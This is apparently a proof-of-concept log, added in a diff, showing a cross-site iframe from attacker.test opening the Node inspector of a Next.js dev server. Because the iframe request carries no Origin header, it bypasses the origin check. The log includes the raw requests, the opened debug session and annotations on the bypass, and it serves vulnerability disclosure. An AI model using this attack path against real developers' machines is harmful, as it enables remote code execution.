@@ -1,0 +1,64 @@
+=== BEFORE attack: inspector port closed ===
+http_code=000
+
+=== running the attack page in real headless Chromium ===
+=== (attacker.test:8899/attack.html loads a hidden cross-site iframe pointed at ===
+===  victimdev.test:3021/__nextjs_attach-nodejs-inspector, transparently proxied ===
+===  to the real next dev server on :3020; also auto-submits a POST form to    ===
+===  /_next/mcp as a second, separately-tested vector)                        ===
+PAGE LOG: Failed to load resource: the server responded with a status of 403 (Forbidden)   <- the POST to /_next/mcp, correctly blocked
+PAGE LOG: Failed to load resource: the server responded with a status of 404 (File not found)
+
+=== AFTER attack: inspector port state - NOW OPEN, with a live debug session ===
+[ {
+  "description": "node.js instance",
+  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/aafad959-2bb4-4537-a928-2f6ff8618d6c",
+  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/aafad959-2bb4-4537-a928-2f6ff8618d6c",
+  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
+  "id": "aafad959-2bb4-4537-a928-2f6ff8618d6c",
+  "title": "/home/user/nextlab/node_modules/next/dist/server/lib/start-server.js",
+  "type": "node",
+  "url": "file:///home/user/nextlab/node_modules/next/dist/server/lib/start-server.js",
+  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/aafad959-2bb4-4537-a928-2f6ff8618d6c"
+} ]
+
+=== raw HTTP requests the dev server actually received, captured transparently by a
+    TCP-level relay proxy (capture_proxy.js) sitting in front of it -- this is
+    exactly what next dev's own request handler saw, byte for byte ===
+
+----REQUEST----
+GET /__nextjs_attach-nodejs-inspector HTTP/1.1
+Host: victimdev.test:3021
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://attacker.test:8899/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+    ^^ NO Origin header at all. This is what a real cross-site <iframe src>
+       navigation produces. blockCrossSiteDEV()'s final check
+       (`originLowerCase !== undefined && ...`) short-circuits to `false`
+       when Origin is absent -- so this reaches the handler, which calls
+       inspector.open() unconditionally.
+
+----REQUEST----
+POST /_next/mcp HTTP/1.1
+Host: victimdev.test:3021
+Connection: keep-alive
+Content-Length: 90
+Cache-Control: max-age=0
+Origin: http://attacker.test:8899
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://attacker.test:8899/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+    ^^ For contrast: a cross-site <form method=POST> submission DOES carry an
+       Origin header in real Chromium, so this one is correctly blocked (403).
+       Confirms the gap is specific to GET/navigation-shaped requests, not a
+       general failure of the check.
